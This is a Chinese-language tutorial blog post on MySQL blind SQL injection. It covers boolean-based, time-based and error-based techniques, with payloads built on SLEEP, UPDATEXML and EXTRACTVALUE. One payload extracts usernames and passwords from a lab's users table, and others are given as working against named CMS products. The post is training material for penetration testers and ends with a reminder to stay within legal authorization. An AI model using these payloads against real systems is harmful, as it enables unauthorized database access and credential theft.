---
title: "SQL 盲注实战总结：布尔、延时与报错注入"
slug: sql-blind-injection-techniques
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - SQL注入
  - top10
tags:
  - SQL注入
  - MySQL
  - 盲注
halo:
  site: http://www.hzhsec.top
  name: d6a4b144-635c-40e9-81ee-be99aee98b1d
  publish: true
---

<!--more-->






# 一、增删改查（CRUD）基础示例

下面示例展示常见的 SQL 操作（以 `news` 表为例），理解这些语句有助于构造注入 payload：

* **查询（Read）**

```sql
SELECT * FROM news WHERE id = $id;
```

* **新增（Create）**

```sql
INSERT INTO news (title, content) VALUES ('标题', '内容');
```

* **删除（Delete）**

```sql
DELETE FROM news WHERE id = $id;
```

* **修改（Update）**

```sql
UPDATE news SET title = '新标题' WHERE id = $id;
```

> 注：理解后端如何拼接这些语句（是否带引号、是否使用预处理、是否对输入做类型转换）是判断注入可行性的关键。

---

# 二、盲注概念与分类

**盲注**：当注入无法直接回显数据到页面时，利用页面差异（布尔/时间/报错）逐位或逐条获取信息的技术。常见三类：

1. **布尔盲注（Boolean-based）**

   * 通过构造条件使页面表现为真或假，从而推断目标信息。
   * 常用函数：`regexp`, `like`, `ascii`, `left`, `ord`, `mid`, `substr`。

2. **延时盲注（Time-based）**

   * 根据 SQL 执行时间判断条件是否成立（`SLEEP()`、`IF()`）。
   * 适用于完全无回显且无法触发错误的情况。

3. **报错盲注（Error-based）**

   * 利用数据库函数触发可回显的错误信息（`updatexml()`、`extractvalue()` 等）。
   * 需目标环境输出原始错误信息才能有效。

---

# 三、布尔盲注常用技巧与示例

* 判断数据库名长度：

```sql
AND LENGTH(DATABASE()) = 7
```

* 判断数据库名第 1 个字符：

```sql
AND LEFT(DATABASE(),1) = 'p'
-- 或
AND ORD(LEFT(DATABASE(),1)) = 112
```

* 逐字符提取（从第 n 位取 1 个字符）：

```sql
AND SUBSTR(DATABASE(), n, 1) = 'x'
```

> `ORD()`/`ASCII()` 常用于绕过单引号或字符串过滤，用数值比较代替字符串比较。

---

# 四、延时盲注示例

* 基础延时：

```sql
AND SLEEP(1)
```

* 条件触发延时：

```sql
AND IF(1=1, SLEEP(5), 0)
-- 或
AND IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0)
```

当请求延迟明显增加时，说明条件成立。

---

# 五、报错盲注示例

* 通过 `updatexml()` 触发错误并在错误中拼接输出：

```sql
AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)
```

* 通过 `extractvalue()`：

```sql
AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))
```

* 在某些 CMS 中可以通过插入/更新导致报错并借报错回显敏感信息：

```sql
'hzk' OR UPDATEXML(1, CONCAT(0x7e, (SELECT CONCAT_WS('-', username, password) FROM pikachu.users LIMIT 0,1)), 1) OR '
```

---

# 六、注入条件判断与测试示例

在检测不同类型注入点时，常见判断语句：

* **布尔型检测**（页面只有成功/失败两种输出）

```sql
AND LENGTH(DATABASE()) = 6
```

* **延时型检测**（通过时间判断）

```sql
AND IF(1=1, SLEEP(5), 0)
```

* **报错型检测**（依赖报错输出）

```sql
AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)
```

**示例比较（删除接口测试）**：

* 删除（延时）：

```sql
1 AND IF(1=1, SLEEP(5), 0)
```

* 删除（布尔）：

```sql
3 AND LENGTH(DATABASE()) = 6  -- 若无回显无法判定
```

* 删除（报错）：

```sql
4 AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)
```

---

# 七、CMS 案例（实战示例）

* **xhcms 插入报错**：

```
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) AND '
```

* **kkcms 删除延时**：

```sql
AND IF(1=1, SLEEP(5), 0)
OR IF(1=1, SLEEP(5), 0)
OR IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0)
```

这些 payload 在不同 CMS 和不同字段类型上可能需要调整引号、注释符号和编码。

---

# 八、小结与检测建议

* 先判断能否回显（若能，优先用 error-based 或 union-based）；
* 无回显优先考虑布尔盲注与延时盲注；
* 使用 `ORD()`/`ASCII()`、十六进制编码、`PREPARE/EXECUTE` 等绕过常见过滤；
* 在真实渗透中遵循法律与授权范围，避免造成破坏性操作（如任意删除/写入）。

---

# 参考资料

* OWASP SQL Injection Cheat Sheet
* 各类 CMS 漏洞实战记录